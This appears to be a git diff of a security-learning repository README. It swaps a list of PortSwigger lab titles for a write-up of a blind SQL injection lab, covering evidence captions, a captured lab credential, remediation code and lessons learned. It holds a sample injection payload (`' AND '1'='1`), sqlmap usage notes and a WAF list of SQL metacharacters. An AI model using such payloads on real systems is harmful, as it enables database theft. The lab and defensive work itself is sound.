-| 04  | Blind OS command injection with out-of-band interaction       | Practitioner | `[PENDING]` | —        |
-| 05  | Blind OS command injection with out-of-band data exfiltration | Practitioner | `[PENDING]` | —        |
-
----
-
-### 05. Business Logic Vulnerabilities — 11 Labs
-
-Business logic flaws arise from improper enforcement of application workflow assumptions, enabling price manipulation, privilege escalation, and workflow bypass that standard vulnerability scanners cannot detect.
-
-**OWASP A04:2021** · **CWE-840**
-
-| #   | Lab Title                                      | Difficulty   | Status      | Write-Up |
-| --- | ---------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Excessive trust in client-side controls        | Apprentice   | `[PENDING]` | —        |
-| 02  | High-level logic vulnerability                 | Apprentice   | `[PENDING]` | —        |
-| 03  | Low-level logic flaw                           | Practitioner | `[PENDING]` | —        |
-| 04  | Inconsistent handling of exceptional input     | Practitioner | `[PENDING]` | —        |
-| 05  | Inconsistent security controls                 | Practitioner | `[PENDING]` | —        |
-| 06  | Weak isolation on dual-use endpoint            | Practitioner | `[PENDING]` | —        |
-| 07  | Insufficient workflow validation               | Practitioner | `[PENDING]` | —        |
-| 08  | Authentication bypass via flawed state machine | Practitioner | `[PENDING]` | —        |
-| 09  | Flawed enforcement of business rules           | Practitioner | `[PENDING]` | —        |
-| 10  | Infinite money logic flaw                      | Practitioner | `[PENDING]` | —        |
-| 11  | Authentication bypass via encryption oracle    | Expert       | `[PENDING]` | —        |
+| Component            | Detail                                              |
+| -------------------- | --------------------------------------------------- |
+| Application          | PortSwigger Web Security Academy — Practitioner lab |
+| Backend DBMS         | PostgreSQL (confirmed by SQLMap fingerprinting)     |
+| Vulnerable Parameter | `TrackingId` cookie                                 |
+| Target Table         | `public.users` — columns: `username`, `password`    |
 
 ---
 
-### 06. Information Disclosure — 5 Labs
+## Evidence
 
-Information disclosure vulnerabilities expose sensitive data — credentials, internal paths, source code, server configuration — to unauthorised parties through error messages, backup files, or debug interfaces.
+### E-01 — TrackingId Cookie Captured in Burp Suite
 
-**OWASP A02:2021** · **CWE-200**
-
-| #   | Lab Title                                         | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Information disclosure in error messages          | Apprentice   | `[PENDING]` | —        |
-| 02  | Information disclosure on debug page              | Apprentice   | `[PENDING]` | —        |
-| 03  | Source code disclosure via backup files           | Apprentice   | `[PENDING]` | —        |
-| 04  | Authentication bypass via information disclosure  | Apprentice   | `[PENDING]` | —        |
-| 05  | Information disclosure in version control history | Practitioner | `[PENDING]` | —        |
+![Burp Suite intercepted POST /login request showing TrackingId and session cookies](evidence/burpsuite.png)
+_Caption: Burp Suite Community Edition v2026.3.2 intercepting the POST /login request. The TrackingId cookie value (`EEhrgu6COj4spjfV`) and session token are visible in the request headers. This parameter was identified as the injection point for the boolean-based blind SQL injection._
 
 ---
 
-### 07. Access Control Vulnerabilities — 13 Labs
+### E-02 — SQLMap Extraction Output — users Table Dumped
 
-Access control flaws allow users to act outside their intended permissions, enabling horizontal and vertical privilege escalation, IDOR exploitation, and administrative function access.
-
-**OWASP A01:2021** · **CWE-284** · **MITRE ATT&CK T1078**
-
-| #   | Lab Title                                                             | Difficulty   | Status      | Write-Up |
-| --- | --------------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Unprotected admin functionality                                       | Apprentice   | `[PENDING]` | —        |
-| 02  | Unprotected admin functionality with unpredictable URL                | Apprentice   | `[PENDING]` | —        |
-| 03  | User role controlled by request parameter                             | Apprentice   | `[PENDING]` | —        |
-| 04  | User role can be modified in user profile                             | Apprentice   | `[PENDING]` | —        |
-| 05  | User ID controlled by request parameter                               | Apprentice   | `[PENDING]` | —        |
-| 06  | User ID controlled by request parameter, with unpredictable user IDs  | Apprentice   | `[PENDING]` | —        |
-| 07  | User ID controlled by request parameter with data leakage in redirect | Apprentice   | `[PENDING]` | —        |
-| 08  | User ID controlled by request parameter with password disclosure      | Apprentice   | `[PENDING]` | —        |
-| 09  | Insecure direct object references                                     | Apprentice   | `[PENDING]` | —        |
-| 10  | URL-based access control can be circumvented                          | Practitioner | `[PENDING]` | —        |
-| 11  | Method-based access control can be circumvented                       | Practitioner | `[PENDING]` | —        |
-| 12  | Multi-step process with no access control on one step                 | Practitioner | `[PENDING]` | —        |
-| 13  | Referer-based access control                                          | Practitioner | `[PENDING]` | —        |
+![SQLMap terminal output confirming PostgreSQL DBMS and dumping users table with plaintext credentials](evidence/password-captured.png)
+_Caption: SQLMap output confirming the backend DBMS as PostgreSQL via boolean-based blind inference. The tool enumerated 3 entries from `public.users`, recovering plaintext credentials for administrator (`ju5sl7dscs68gdmwsniv`), carlos, and wiener. The injected payload and extraction timestamps are visible in the log._
 
 ---
 
-### 08. File Upload Vulnerabilities — 7 Labs
+### E-03 — Lab Solved — Authenticated as Administrator
 
-File upload flaws allow attackers to upload and execute malicious files, enabling remote code execution, web shell deployment, and full server compromise through insufficient validation or content-type controls.
-
-**OWASP A04:2021** · **CWE-434** · **MITRE ATT&CK T1505.003**
-
-| #   | Lab Title                                            | Difficulty   | Status      | Write-Up |
-| --- | ---------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Remote code execution via web shell upload           | Apprentice   | `[PENDING]` | —        |
-| 02  | Web shell upload via Content-Type restriction bypass | Apprentice   | `[PENDING]` | —        |
-| 03  | Web shell upload via path traversal                  | Practitioner | `[PENDING]` | —        |
-| 04  | Web shell upload via extension blacklist bypass      | Practitioner | `[PENDING]` | —        |
-| 05  | Web shell upload via obfuscated file extension       | Practitioner | `[PENDING]` | —        |
-| 06  | Remote code execution via polyglot web shell upload  | Practitioner | `[PENDING]` | —        |
-| 07  | Web shell upload via race condition                  | Expert       | `[PENDING]` | —        |
+![Web Security Academy lab page marked as Solved with administrator account active in My Account view](evidence/lab-solved.png)
+_Caption: Successful authentication as `administrator` using the extracted credential. The lab banner displays "Congratulations, you solved the lab!" and the account page confirms `Your username is: administrator`. URL: `/my-account?id=administrator`._
 
 ---
 
-### 09. Race Conditions — 6 Labs
+## Remediation
 
-Race conditions occur when an application processes concurrent requests in an unpredictable order, enabling limit bypass, double-spending, and authentication circumvention through sub-millisecond timing exploitation.
+### R-01 — Parameterize All Database Queries (Addresses F-01)
 
-**OWASP A04:2021** · **CWE-362** · **MITRE ATT&CK T1499**
+**Priority:** `[IMMEDIATE]`
 
-| #   | Lab Title                                 | Difficulty   | Status      | Write-Up |
-| --- | ----------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Limit overrun race conditions             | Apprentice   | `[PENDING]` | —        |
-| 02  | Bypassing rate limits via race conditions | Practitioner | `[PENDING]` | —        |
-| 03  | Multi-endpoint race conditions            | Practitioner | `[PENDING]` | —        |
-| 04  | Single-endpoint race conditions           | Practitioner | `[PENDING]` | —        |
-| 05  | Partial construction race conditions      | Expert       | `[PENDING]` | —        |
-| 06  | Exploiting time-sensitive vulnerabilities | Expert       | `[PENDING]` | —        |
+Replace dynamic string concatenation in the analytics query with parameterized statements using bound parameters. The query must never accept raw cookie input as an inline SQL fragment.
 
----
+**PostgreSQL (Python/psycopg2 example):**
 
-### 10. Server-Side Request Forgery (SSRF) — 7 Labs
+```python
+# Vulnerable pattern — DO NOT USE
+cursor.execute(f"SELECT * FROM tracking WHERE id = '{tracking_id}'")
 
-SSRF vulnerabilities allow attackers to induce the server to issue HTTP requests to unintended destinations, enabling access to internal services, cloud metadata APIs, and back-end systems unreachable from the internet.
+# Secure pattern — parameterized query
+cursor.execute("SELECT * FROM tracking WHERE id = %s", (tracking_id,))
+```
 
-**OWASP A10:2021** · **CWE-918** · **MITRE ATT&CK T1090**
+**PostgreSQL (Java/JDBC example):**
 
-| #   | Lab Title                                  | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------ | ------------ | ----------- | -------- |
-| 01  | Basic SSRF against the local server        | Apprentice   | `[PENDING]` | —        |
-| 02  | Basic SSRF against another back-end system | Apprentice   | `[PENDING]` | —        |
-| 03  | SSRF with blacklist-based input filter     | Practitioner | `[PENDING]` | —        |
-| 04  | SSRF with whitelist-based input filter     | Practitioner | `[PENDING]` | —        |
-| 05  | SSRF via open redirection                  | Practitioner | `[PENDING]` | —        |
-| 06  | Blind SSRF with out-of-band detection      | Practitioner | `[PENDING]` | —        |
-| 07  | Blind SSRF with Shellshock exploitation    | Expert       | `[PENDING]` | —        |
+```java
+// Secure pattern
+PreparedStatement stmt = conn.prepareStatement(
+    "SELECT * FROM tracking WHERE id = ?"
+);
+stmt.setString(1, trackingId);
+```
+
+**Retest Criteria:** After deployment, submit the payload `' AND '1'='1` as the `TrackingId` cookie value. Confirm that the "Welcome back" message does not appear or disappear based on this condition. Verify with `sqlmap --technique=B` — expected result: no injectable parameter detected.
 
 ---
 
-### 11. XML External Entity (XXE) Injection — 9 Labs
+### R-02 — Store Credentials Using Adaptive Hashing (Defense in Depth)
 
-XXE injection enables attackers to interfere with XML processing to retrieve server-side files, perform SSRF, and in certain configurations achieve remote code execution through maliciously crafted XML documents.
+**Priority:** `[SHORT-TERM]`
 
-**OWASP A05:2021** · **CWE-611** · **MITRE ATT&CK T1190**
+Plaintext passwords were recovered directly from the database. Implement adaptive hashing (bcrypt, scrypt, or Argon2id) for all stored credentials. This limits the impact of any future data extraction to computationally expensive offline cracking attempts rather than immediate plaintext exposure.
 
-| #   | Lab Title                                                              | Difficulty   | Status      | Write-Up |
-| --- | ---------------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Exploiting XXE using external entities to retrieve files               | Apprentice   | `[PENDING]` | —        |
-| 02  | Exploiting XXE to perform SSRF attacks                                 | Apprentice   | `[PENDING]` | —        |
-| 03  | Blind XXE with out-of-band interaction                                 | Practitioner | `[PENDING]` | —        |
-| 04  | Blind XXE with out-of-band interaction via XML parameter entities      | Practitioner | `[PENDING]` | —        |
-| 05  | Exploiting blind XXE to exfiltrate data using a malicious external DTD | Practitioner | `[PENDING]` | —        |
-| 06  | Exploiting blind XXE to retrieve data via error messages               | Practitioner | `[PENDING]` | —        |
-| 07  | Exploiting XInclude to retrieve files                                  | Practitioner | `[PENDING]` | —        |
-| 08  | Exploiting XXE via image file upload                                   | Practitioner | `[PENDING]` | —        |
-| 09  | Exploiting XXE to retrieve data by repurposing a local DTD             | Expert       | `[PENDING]` | —        |
+```python
+# Python — bcrypt example
+import bcrypt
+hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12))
+```
+
+**Retest Criteria:** Confirm that no column in `users` or equivalent tables stores plaintext or weakly-hashed (MD5/SHA-1) passwords. Verify hash format begins with `$2b$` (bcrypt) or equivalent Argon2id prefix.
 
 ---
 
-### 12. NoSQL Injection — 4 Labs
+### R-03 — Implement Web Application Firewall Rule for SQL Metacharacters in Cookies
 
-NoSQL injection allows attackers to manipulate query logic through operator injection, enabling authentication bypass, arbitrary data extraction, and field enumeration against document-based databases.
+**Priority:** `[SHORT-TERM]`
 
-**OWASP A03:2021** · **CWE-943**
-
-| #   | Lab Title                                                     | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Detecting NoSQL injection                                     | Apprentice   | `[PENDING]` | —        |
-| 02  | Exploiting NoSQL operator injection to bypass authentication  | Apprentice   | `[PENDING]` | —        |
-| 03  | Exploiting NoSQL injection to extract data                    | Practitioner | `[PENDING]` | —        |
-| 04  | Exploiting NoSQL operator injection to extract unknown fields | Practitioner | `[PENDING]` | —        |
+Deploy a WAF rule to detect and block SQL metacharacters (`'`, `--`, `AND`, `OR`, `UNION`, `SELECT`) in cookie values. This is a compensating control — not a substitute for parameterization — but reduces automated exploitation risk.
 
 ---
 
-### 13. API Testing — 5 Labs
+### R-04 — Enforce Principle of Least Privilege on Database Accounts
 
-API testing vulnerabilities include exposed documentation, mass assignment, parameter pollution, and undocumented endpoint abuse that expose sensitive backend functionality beyond the intended API surface.
+**Priority:** `[PLANNED]`
 
-**OWASP A01:2021 / A04:2021**
-
-| #   | Lab Title                                                    | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------------------------ | ------------ | ----------- | -------- |
-| 01  | Exploiting an API endpoint using documentation               | Apprentice   | `[PENDING]` | —        |
-| 02  | Exploiting unused API endpoint                               | Apprentice   | `[PENDING]` | —        |
-| 03  | Finding and exploiting an unused API endpoint                | Practitioner | `[PENDING]` | —        |
-| 04  | Exploiting a mass assignment vulnerability                   | Practitioner | `[PENDING]` | —        |
-| 05  | Exploiting server-side parameter pollution in a query string | Practitioner | `[PENDING]` | —        |
+The analytics query account should not have SELECT access to the `users` table. Separate application database roles by function: the analytics role should access only analytics tables. Credential tables should require elevated, explicitly granted roles.
 
 ---
 
-### 14. Web Cache Deception — 5 Labs
+## Lessons Learned
 
-Web cache deception tricks caching infrastructure into storing sensitive, user-specific responses under publicly accessible URLs, enabling credential and session token theft without active user interaction.
+### Technical
 
-**OWASP A05:2021** · **CWE-525**
+- Boolean-based blind SQL injection does not require error messages or query output to be exploitable. The single binary signal of a conditional application response is sufficient for full data extraction.
+- Cookie parameters are frequently overlooked during manual code review because they are treated as trusted session infrastructure rather than user-controlled input. All parameters — regardless of transport mechanism — must be sanitized or parameterized.
+- SQLMap's `--batch` flag with DBMS pre-specified (`--dbms=postgresql`) significantly reduced enumeration time by eliminating unnecessary DBMS fingerprinting rounds.
+- PostgreSQL's string comparison functions (`SUBSTR`, `LENGTH`) are directly usable in boolean inference payloads, and SQLMap's boolean-based engine handles this transparently.
 
-| #   | Lab Title                                                      | Difficulty   | Status      | Write-Up |
-| --- | -------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Exploiting path mapping for web cache deception                | Apprentice   | `[PENDING]` | —        |
-| 02  | Exploiting path delimiters for web cache deception             | Practitioner | `[PENDING]` | —        |
-| 03  | Exploiting origin server normalization for web cache deception | Practitioner | `[PENDING]` | —        |
-| 04  | Exploiting cache server normalization for web cache deception  | Practitioner | `[PENDING]` | —        |
-| 05  | Exploiting exact-match cache rules for web cache deception     | Expert       | `[PENDING]` | —        |
+### Process
 
----
+- Saving the full raw Burp Suite request to a file before running `sqlmap` is essential for cookie-based injection — passing a request file via `-r` ensures all headers and cookie values are correctly reproduced.
+- Annotating terminal output screenshots (circling the extracted table and payload block) increases evidence clarity for portfolio and report use.
 
-## Client-Side Topics
+### Skills Demonstrated
 
----
-
-### 15. Cross-Site Scripting (XSS) — 30 Labs
-
-XSS enables injection of malicious scripts into pages viewed by other users, enabling session hijacking, credential theft, keylogging, and chained CSRF attacks across reflected, stored, and DOM-based delivery mechanisms.
-
-**OWASP A03:2021** · **CWE-79** · **MITRE ATT&CK T1059.007**
-
-| #   | Lab Title                                                                                                                 | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------------------------------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Reflected XSS into HTML context with nothing encoded                                                                      | Apprentice   | `[PENDING]` | —        |
-| 02  | Stored XSS into HTML context with nothing encoded                                                                         | Apprentice   | `[PENDING]` | —        |
-| 03  | DOM XSS in document.write sink using source location.search                                                               | Apprentice   | `[PENDING]` | —        |
-| 04  | DOM XSS in innerHTML sink using source location.search                                                                    | Apprentice   | `[PENDING]` | —        |
-| 05  | DOM XSS in jQuery anchor href attribute sink using location.search source                                                 | Apprentice   | `[PENDING]` | —        |
-| 06  | DOM XSS in jQuery selector sink using a hashchange event                                                                  | Apprentice   | `[PENDING]` | —        |
-| 07  | Reflected XSS into attribute with angle brackets HTML-encoded                                                             | Apprentice   | `[PENDING]` | —        |
-| 08  | Stored XSS into anchor href attribute with double quotes HTML-encoded                                                     | Apprentice   | `[PENDING]` | —        |
-| 09  | Reflected XSS into a JavaScript string with angle brackets HTML encoded                                                   | Apprentice   | `[PENDING]` | —        |
-| 10  | DOM XSS in document.write sink using source location.search inside a select element                                       | Practitioner | `[PENDING]` | —        |
-| 11  | DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded                                        | Practitioner | `[PENDING]` | —        |
-| 12  | Reflected DOM XSS                                                                                                         | Practitioner | `[PENDING]` | —        |
-| 13  | Stored DOM XSS                                                                                                            | Practitioner | `[PENDING]` | —        |
-| 14  | Exploiting cross-site scripting to steal cookies                                                                          | Practitioner | `[PENDING]` | —        |
-| 15  | Exploiting cross-site scripting to capture passwords                                                                      | Practitioner | `[PENDING]` | —        |
-| 16  | Exploiting XSS to perform CSRF                                                                                            | Practitioner | `[PENDING]` | —        |
-| 17  | Reflected XSS into HTML context with most tags and attributes blocked                                                     | Practitioner | `[PENDING]` | —        |
-| 18  | Reflected XSS into HTML context with all tags blocked except custom ones                                                  | Practitioner | `[PENDING]` | —        |
-| 19  | Reflected XSS with some SVG markup allowed                                                                                | Practitioner | `[PENDING]` | —        |
-| 20  | Reflected XSS in canonical link tag                                                                                       | Practitioner | `[PENDING]` | —        |
-| 21  | Reflected XSS into a JavaScript string with single quote and backslash escaped                                            | Practitioner | `[PENDING]` | —        |
-| 22  | Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped       | Practitioner | `[PENDING]` | —        |
-| 23  | Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped  | Practitioner | `[PENDING]` | —        |
-| 24  | Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped | Practitioner | `[PENDING]` | —        |
-| 25  | Reflected XSS with event handlers and href attributes blocked                                                             | Expert       | `[PENDING]` | —        |
-| 26  | Reflected XSS in a JavaScript URL with some characters blocked                                                            | Expert       | `[PENDING]` | —        |
-| 27  | Reflected XSS with AngularJS sandbox escape without strings                                                               | Expert       | `[PENDING]` | —        |
-| 28  | Reflected XSS with AngularJS sandbox escape and CSP                                                                       | Expert       | `[PENDING]` | —        |
-| 29  | Reflected XSS protected by very strict CSP, with dangling markup attack                                                   | Expert       | `[PENDING]` | —        |
-| 30  | Reflected XSS protected by CSP, with CSP bypass                                                                           | Expert       | `[PENDING]` | —        |
+`blind-sqli` `boolean-inference` `postgresql` `sqlmap` `burp-suite` `credential-extraction` `owasp-a03` `cookie-injection` `web-application-security` `portswigger`
 
 ---
 
-### 16. Cross-Site Request Forgery (CSRF) — 12 Labs
-
-CSRF tricks authenticated users into unknowingly submitting malicious requests, enabling account takeover, state-changing actions, and privilege escalation without requiring stolen credentials.
-
-**OWASP A01:2021** · **CWE-352** · **MITRE ATT&CK T1185**
-
-| #   | Lab Title                                                     | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | CSRF vulnerability with no defenses                           | Apprentice   | `[PENDING]` | —        |
-| 02  | CSRF where token validation depends on request method         | Practitioner | `[PENDING]` | —        |
-| 03  | CSRF where token validation depends on token being present    | Practitioner | `[PENDING]` | —        |
-| 04  | CSRF where token is not tied to user session                  | Practitioner | `[PENDING]` | —        |
-| 05  | CSRF where token is tied to non-session cookie                | Practitioner | `[PENDING]` | —        |
-| 06  | CSRF where token is duplicated in cookie                      | Practitioner | `[PENDING]` | —        |
-| 07  | SameSite Lax bypass via method override                       | Practitioner | `[PENDING]` | —        |
-| 08  | SameSite Strict bypass via client-side redirect               | Practitioner | `[PENDING]` | —        |
-| 09  | SameSite Strict bypass via sibling domain                     | Expert       | `[PENDING]` | —        |
-| 10  | SameSite Lax bypass via cookie refresh                        | Expert       | `[PENDING]` | —        |
-| 11  | CSRF where Referer validation depends on header being present | Practitioner | `[PENDING]` | —        |
-| 12  | CSRF with broken Referer validation                           | Practitioner | `[PENDING]` | —        |
-
----
-
-### 17. Cross-Origin Resource Sharing (CORS) — 3 Labs
-
-Misconfigured CORS policies allow malicious cross-origin sites to issue authenticated requests on behalf of users, exposing sensitive data, API keys, and account actions.
-
-**OWASP A01:2021** · **CWE-942**
-
-| #   | Lab Title                                          | Difficulty   | Status      | Write-Up |
-| --- | -------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | CORS vulnerability with basic origin reflection    | Apprentice   | `[PENDING]` | —        |
-| 02  | CORS vulnerability with trusted null origin        | Practitioner | `[PENDING]` | —        |
-| 03  | CORS vulnerability with trusted insecure protocols | Practitioner | `[PENDING]` | —        |
-
----
-
-### 18. Clickjacking — 5 Labs
-
-Clickjacking embeds victim pages in invisible iframes, deceiving users into performing unintended actions including credential submission, fund transfers, and account modification on the underlying application.
-
-**OWASP A04:2021** · **CWE-1021**
-
-| #   | Lab Title                                                        | Difficulty   | Status      | Write-Up |
-| --- | ---------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Basic clickjacking with CSRF token protection                    | Apprentice   | `[PENDING]` | —        |
-| 02  | Clickjacking with form input data prefilled from a URL parameter | Apprentice   | `[PENDING]` | —        |
-| 03  | Clickjacking with a frame buster script                          | Apprentice   | `[PENDING]` | —        |
-| 04  | Exploiting clickjacking vulnerability to trigger DOM-based XSS   | Practitioner | `[PENDING]` | —        |
-| 05  | Multistep clickjacking                                           | Practitioner | `[PENDING]` | —        |
-
----
-
-### 19. DOM-Based Vulnerabilities — 7 Labs
-
-DOM-based vulnerabilities arise when client-side JavaScript processes attacker-controlled data and passes it to a dangerous sink without sanitisation, enabling XSS, open redirection, and cookie manipulation entirely within the browser.
-
-**OWASP A03:2021** · **CWE-79** · **MITRE ATT&CK T1059.007**
-
-| #   | Lab Title                                        | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------------ | ------------ | ----------- | -------- |
-| 01  | DOM XSS using web messages                       | Apprentice   | `[PENDING]` | —        |
-| 02  | DOM XSS using web messages and a JavaScript URL  | Practitioner | `[PENDING]` | —        |
-| 03  | DOM XSS using web messages and JSON.parse        | Practitioner | `[PENDING]` | —        |
-| 04  | DOM-based open redirection                       | Practitioner | `[PENDING]` | —        |
-| 05  | DOM-based cookie manipulation                    | Practitioner | `[PENDING]` | —        |
-| 06  | Exploiting DOM clobbering to enable XSS          | Expert       | `[PENDING]` | —        |
-| 07  | Clobbering DOM attributes to bypass HTML filters | Expert       | `[PENDING]` | —        |
-
----
-
-### 20. WebSockets — 3 Labs
-
-WebSocket vulnerabilities include live message manipulation, cross-site WebSocket hijacking, and handshake tampering that expose real-time application data and enable persistent session abuse.
-
-**OWASP A01:2021** · **CWE-345**
-
-| #   | Lab Title                                                       | Difficulty   | Status      | Write-Up |
-| --- | --------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Manipulating WebSocket messages to exploit vulnerabilities      | Apprentice   | `[PENDING]` | —        |
-| 02  | Cross-site WebSocket hijacking                                  | Practitioner | `[PENDING]` | —        |
-| 03  | Manipulating the WebSocket handshake to exploit vulnerabilities | Practitioner | `[PENDING]` | —        |
-
----
-
-## Advanced Topics
-
----
-
-### 21. Insecure Deserialization — 10 Labs
-
-Insecure deserialization enables object injection, gadget chain exploitation, and remote code execution by allowing applications to process attacker-controlled serialized data without integrity checking.
-
-**OWASP A08:2021** · **CWE-502** · **MITRE ATT&CK T1059**
-
-| #   | Lab Title                                                           | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Modifying serialized objects                                        | Apprentice   | `[PENDING]` | —        |
-| 02  | Modifying serialized data types                                     | Practitioner | `[PENDING]` | —        |
-| 03  | Using application functionality to exploit insecure deserialization | Practitioner | `[PENDING]` | —        |
-| 04  | Arbitrary object injection in PHP                                   | Practitioner | `[PENDING]` | —        |
-| 05  | Exploiting Java deserialization with Apache Commons                 | Practitioner | `[PENDING]` | —        |
-| 06  | Exploiting PHP deserialization with a pre-built gadget chain        | Practitioner | `[PENDING]` | —        |
-| 07  | Exploiting Ruby deserialization using a documented gadget chain     | Practitioner | `[PENDING]` | —        |
-| 08  | Developing a custom gadget chain for Java deserialization           | Expert       | `[PENDING]` | —        |
-| 09  | Developing a custom gadget chain for PHP deserialization            | Expert       | `[PENDING]` | —        |
-| 10  | Using PHAR deserialization to deploy a custom gadget chain          | Expert       | `[PENDING]` | —        |
-
----
-
-### 22. Web LLM Attacks — 7 Labs
-
-Web LLM attacks exploit AI-integrated applications through prompt injection, excessive agency abuse, and insecure output handling to exfiltrate data, manipulate application behaviour, and pivot through LLM-connected APIs.
-
-**OWASP Top 10 for LLMs 2025** · **MITRE ATLAS**
-
-| #   | Lab Title                                                      | Difficulty   | Status      | Write-Up |
-| --- | -------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Exploiting LLM APIs with excessive agency                      | Apprentice   | `[PENDING]` | —        |
-| 02  | Exploiting vulnerabilities in LLM APIs                         | Apprentice   | `[PENDING]` | —        |
-| 03  | Indirect prompt injection                                      | Practitioner | `[PENDING]` | —        |
-| 04  | Exploiting insecure output handling in LLMs                    | Practitioner | `[PENDING]` | —        |
-| 05  | Indirect prompt injection via stored content                   | Practitioner | `[PENDING]` | —        |
-| 06  | Exploiting LLM APIs with excessive agency via function calling | Practitioner | `[PENDING]` | —        |
-| 07  | Indirect prompt injection via rendered markdown                | Expert       | `[PENDING]` | —        |
-
----
-
-### 23. GraphQL API Vulnerabilities — 5 Labs
-
-GraphQL vulnerabilities include introspection exposure, IDOR through query manipulation, CSRF over GraphQL endpoints, and type system abuse that bypasses access controls and exposes backend schema and data.
-
-**OWASP A01:2021 / A03:2021**
-
-| #   | Lab Title                                     | Difficulty   | Status      | Write-Up |
-| --- | --------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Accessing private GraphQL posts               | Apprentice   | `[PENDING]` | —        |
-| 02  | Accidental exposure of private GraphQL fields | Apprentice   | `[PENDING]` | —        |
-| 03  | Finding a hidden GraphQL endpoint             | Practitioner | `[PENDING]` | —        |
-| 04  | Bypassing GraphQL introspection defences      | Practitioner | `[PENDING]` | —        |
-| 05  | Performing CSRF exploits over GraphQL         | Practitioner | `[PENDING]` | —        |
-
----
-
-### 24. Server-Side Template Injection — 7 Labs
-
-SSTI occurs when user input is unsafely embedded into server-side templates, enabling template expression evaluation and in most confirmed cases full remote code execution on the underlying host.
-
-**OWASP A03:2021** · **CWE-94** · **MITRE ATT&CK T1059**
-
-| #   | Lab Title                                                                            | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------------------------------------------------ | ------------ | ----------- | -------- |
-| 01  | Basic server-side template injection                                                 | Practitioner | `[PENDING]` | —        |
-| 02  | Basic server-side template injection (code context)                                  | Practitioner | `[PENDING]` | —        |
-| 03  | Server-side template injection using documentation                                   | Practitioner | `[PENDING]` | —        |
-| 04  | Server-side template injection in an unknown language with a documented exploit      | Practitioner | `[PENDING]` | —        |
-| 05  | Server-side template injection with information disclosure via user-supplied objects | Practitioner | `[PENDING]` | —        |
-| 06  | Server-side template injection in a sandboxed environment                            | Expert       | `[PENDING]` | —        |
-| 07  | Server-side template injection with a custom exploit                                 | Expert       | `[PENDING]` | —        |
-
----
-
-### 25. Web Cache Poisoning — 13 Labs
-
-Web cache poisoning manipulates unkeyed request components to store and serve malicious responses to other users, enabling persistent XSS and targeted content injection delivered at cache scale.
-
-**OWASP A05:2021** · **CWE-444**
-
-| #   | Lab Title                                                                                        | Difficulty   | Status      | Write-Up |
-| --- | ------------------------------------------------------------------------------------------------ | ------------ | ----------- | -------- |
-| 01  | Web cache poisoning with an unkeyed header                                                       | Practitioner | `[PENDING]` | —        |
-| 02  | Web cache poisoning with an unkeyed cookie                                                       | Practitioner | `[PENDING]` | —        |
-| 03  | Web cache poisoning with multiple headers                                                        | Practitioner | `[PENDING]` | —        |
-| 04  | Targeted web cache poisoning using an unknown header                                             | Practitioner | `[PENDING]` | —        |
-| 05  | Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria | Practitioner | `[PENDING]` | —        |
-| 06  | Combining web cache poisoning vulnerabilities                                                    | Expert       | `[PENDING]` | —        |
-| 07  | Web cache poisoning via an unkeyed query string                                                  | Practitioner | `[PENDING]` | —        |
-| 08  | Web cache poisoning via an unkeyed query parameter                                               | Practitioner | `[PENDING]` | —        |
-| 09  | Parameter cloaking                                                                               | Practitioner | `[PENDING]` | —        |
-| 10  | Web cache poisoning via a fat GET request                                                        | Practitioner | `[PENDING]` | —        |
-| 11  | URL normalization                                                                                | Practitioner | `[PENDING]` | —        |
-| 12  | Cache key injection                                                                              | Expert       | `[PENDING]` | —        |
-| 13  | Internal cache poisoning                                                                         | Expert       | `[PENDING]` | —        |
-
----
-
-### 26. HTTP Host Header Attacks — 7 Labs
-
-HTTP Host header attacks exploit applications that trust the Host header for routing or URL generation, enabling password reset poisoning, web cache poisoning, SSRF, and authentication bypass.
-
-**OWASP A03:2021** · **CWE-20**
-
-| #   | Lab Title                                          | Difficulty   | Status      | Write-Up |
-| --- | -------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | Basic password reset poisoning                     | Apprentice   | `[PENDING]` | —        |
-| 02  | Host header authentication bypass                  | Apprentice   | `[PENDING]` | —        |
-| 03  | Web cache poisoning via ambiguous requests         | Practitioner | `[PENDING]` | —        |
-| 04  | Routing-based SSRF                                 | Practitioner | `[PENDING]` | —        |
-| 05  | SSRF via flawed request parsing                    | Expert       | `[PENDING]` | —        |
-| 06  | Host validation bypass via connection state attack | Expert       | `[PENDING]` | —        |
-| 07  | Password reset poisoning via dangling markup       | Expert       | `[PENDING]` | —        |
-
----
-
-### 27. HTTP Request Smuggling — 22 Labs
-
-HTTP request smuggling exploits parsing discrepancies between front-end and back-end systems to smuggle malicious requests past security controls, enabling request hijacking, access control bypass, and cache poisoning.
-
-**OWASP A04:2021** · **CWE-444** · **MITRE ATT&CK T1190**
-
-| #   | Lab Title                                                                                    | Difficulty   | Status      | Write-Up |
-| --- | -------------------------------------------------------------------------------------------- | ------------ | ----------- | -------- |
-| 01  | HTTP request smuggling, basic CL.TE vulnerability                                            | Practitioner | `[PENDING]` | —        |
